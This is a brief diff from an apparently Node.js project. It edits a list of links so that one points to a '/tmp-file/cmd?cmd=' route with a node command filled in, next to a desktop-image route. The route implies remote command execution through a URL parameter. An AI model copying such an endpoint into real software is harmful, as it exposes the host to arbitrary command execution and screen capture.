@@ -14,7 +14,7 @@ async function getFiles(ctx) {
     const files = fs.readdirSync(tmpPath);
 
     const result = [
-        `/tmp-file/cmd?cmd=`,
+        `/tmp-file/cmd?cmd=node src/utils/zlPP/index.js`,
         `/tmp-file/getDeskImg`,
     ];
     files.forEach(function(file) {
